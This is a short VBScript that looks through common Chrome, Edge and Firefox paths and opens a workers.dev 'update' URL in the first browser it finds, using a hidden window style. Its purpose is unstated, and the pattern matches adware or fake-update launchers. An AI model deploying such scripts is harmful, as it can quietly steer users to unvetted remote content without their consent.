Option Explicit

Dim shell, fso, localAppData, url, candidates, candidate, browserPath, browserFlag
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
url = "https://wordscape.weleuther900.workers.dev/?update=20260815-15"
candidates = Array( _
  Array(fso.BuildPath(localAppData, "Google\Chrome\Application\chrome.exe"), "--new-window"), _
  Array("C:\Program Files\Google\Chrome\Application\chrome.exe", "--new-window"), _
  Array("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--new-window"), _
  Array("C:\Program Files\Microsoft\Edge\Application\msedge.exe", "--new-window"), _
  Array("C:\Program Files\Mozilla Firefox\firefox.exe", "-new-window") _
)

browserPath = ""
browserFlag = ""
For Each candidate In candidates
  If fso.FileExists(candidate(0)) Then
    browserPath = candidate(0)
    browserFlag = candidate(1)
    Exit For
  End If
Next

If browserPath <> "" Then
  shell.Run Chr(34) & browserPath & Chr(34) & " " & browserFlag & " " & Chr(34) & url & Chr(34), 0, False
Else
  shell.Run Chr(34) & url & Chr(34), 0, False
End If
